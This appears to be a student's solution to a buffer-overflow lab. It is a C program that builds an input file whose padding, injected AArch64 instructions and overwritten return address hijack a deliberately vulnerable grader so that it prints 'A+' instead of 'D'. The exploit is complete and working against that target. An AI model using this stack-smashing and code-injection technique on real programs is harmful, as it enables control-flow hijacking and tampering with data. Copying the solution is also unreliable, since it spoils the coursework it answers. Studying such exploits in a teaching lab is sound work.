/*--------------------------------------------------------------------*/
/* createdataAplus.c                                                  */
/* author: replaced_author                                             */
/*--------------------------------------------------------------------*/

/*
  this program sets up a crafted input file named "dataAplus" that,
  when passed into the vulnerable grader executable, tricks the grader
  into printing "A+" rather than "D". we rely on a buffer overflow
  scenario, placing both data and executable instructions where they
  shouldn't be, effectively hijacking the control flow.

  the key steps:
  - write out a chosen identifier and end it with a null character.
  - push beyond normal buffer boundaries with extra padding bytes.
  - insert an 'A' character, followed by a few alignment nulls.
  - embed instructions that load and print 'A', rewrite 'D' to '+' in
    the grade variable, and jump back into the main routine's normal
    flow.
  - adjust the return pointer to ensure our code executes at runtime.
*/

/*
  runtime behavior:
  - no arguments needed.
  - does not read from stdin or any other input stream.
  - it doesn't write anything to standard output or error.
  - it solely writes a carefully engineered byte sequence into "dataAplus".
  - upon completion, returns 0 if successful.
*/

#include <stdio.h>
#include <stdint.h>
#include "miniassembler.h"

/* constants extracted from analysis of the grader binary */
enum {
    LEN_USER_ALIAS      = 9,       /* length of "AnishKKat" without its trailing null */
    CNT_NULL_TERM       = 1,       /* one null terminator to properly end the name */
    CNT_OVERFLOW        = 10,      /* number of '0' bytes to surpass stack boundaries */
    CNT_ALIGN_BYTES     = 3,       /* extra nulls for precise alignment after 'A' */
    LOC_A_CHAR          = 0x42006c,/* memory address holding the 'A' character */
    LOC_INSTR_START     = 0x420070,/* where our injected instructions will reside */
    LOC_PRINTF          = 0x400690,/* entry point of the printf function */
    LOC_GRADE           = 0x420044,/* address of the 'grade' variable in data segment */
    LOC_BACK_MAIN       = 0x40089c,/* where we jump back in the main routine */
    SHIFT_BL_INSTR      = 2,
    MASK_BL_INSTR       = 0x03FFFFFF
};

/* 
  this helper assembles a BL (branch-link) instruction that makes the pc jump
  to a function at ulTargetAddr, saving a return link, assuming the current
  instruction is at ulCurrentAddr. the offset is computed and placed within
  a BL opcode template.
*/
static unsigned int AssembleBranchLink(unsigned long ulTargetAddr,
                                       unsigned long ulCurrentAddr) {
    unsigned int uiEncoding = 0x94000000;
    unsigned int uiOffset = (unsigned int)((ulTargetAddr - ulCurrentAddr) >> SHIFT_BL_INSTR);
    uiEncoding |= (uiOffset & MASK_BL_INSTR);
    return uiEncoding;
}

int main(void) {
    /* name inserted into the bss section, eventually manipulated by the grader */
    const char *pszUserAlias = "AnishKKat";

    /* variables and instructions for file output and code injection */
    FILE *pFileHandle;
    int counter;
    unsigned long modifiedReturnAddr;
    unsigned int instrLoadCharA, instrCallToPrintf;
    unsigned int instrLoadPlusChar, instrLocateGrade;
    unsigned int instrStorePlus, instrJumpBack;

    /* open the crafted payload file */
    pFileHandle = fopen("dataAplus", "w");
    if (!pFileHandle) return 1;

    /* put the chosen alias plus its terminating null */
    fwrite(pszUserAlias, 1, LEN_USER_ALIAS, pFileHandle);
    fputc('\0', pFileHandle);

    /* fill with '0' chars to overflow stack frames and reach critical data */
    for (counter = 0; counter < CNT_OVERFLOW; counter++) {
        fputc('0', pFileHandle);
    }

    /* place 'A', which we'll print, followed by nulls for alignment */
    fputc('A', pFileHandle);
    for (counter = 0; counter < CNT_ALIGN_BYTES; counter++) {
        fputc('\0', pFileHandle);
    }

    /*
       now we build the custom instructions that will run after the overflow:
       1. load the 'A' address into x0 so printf sees a string start.
       2. branch-link to printf to print that 'A' char.
       3. move the '+' character into w0, preparing for grade rewrite.
       4. load the grade address into x1 so we know where to write '+'.
       5. store '+' in place of 'D' at the grade address.
       6. jump back into main as if nothing odd happened, now with 'A+' in place.
    */

    /* load address of 'A' into x0 */
    instrLoadCharA      = MiniAssembler_adr(0, LOC_A_CHAR, LOC_INSTR_START);

    /* call printf with BL */
    instrCallToPrintf   = AssembleBranchLink(LOC_PRINTF, LOC_INSTR_START + 4);

    /* insert '+' into w0 */
    instrLoadPlusChar   = MiniAssembler_mov(0, '+');

    /* obtain the grade variable address in x1 */
    instrLocateGrade     = MiniAssembler_adr(1, LOC_GRADE, LOC_INSTR_START + 12);

    /* store '+' byte into grade variable */
    instrStorePlus       = MiniAssembler_strb(0, 1);

    /* jump back to the main code block */
    instrJumpBack        = MiniAssembler_b(LOC_BACK_MAIN, LOC_INSTR_START + 20);

    /* write out the assembled instructions in the correct sequence */
    fwrite(&instrLoadCharA,    sizeof(unsigned int), 1, pFileHandle);
    fwrite(&instrCallToPrintf, sizeof(unsigned int), 1, pFileHandle);
    fwrite(&instrLoadPlusChar, sizeof(unsigned int), 1, pFileHandle);
    fwrite(&instrLocateGrade,  sizeof(unsigned int), 1, pFileHandle);
    fwrite(&instrStorePlus,    sizeof(unsigned int), 1, pFileHandle);
    fwrite(&instrJumpBack,     sizeof(unsigned int), 1, pFileHandle);

    /* override the saved return pointer to divert execution into our code block */
    modifiedReturnAddr = LOC_INSTR_START;
    fwrite(&modifiedReturnAddr, sizeof(unsigned long), 1, pFileHandle);

    fclose(pFileHandle);
    return 0;
}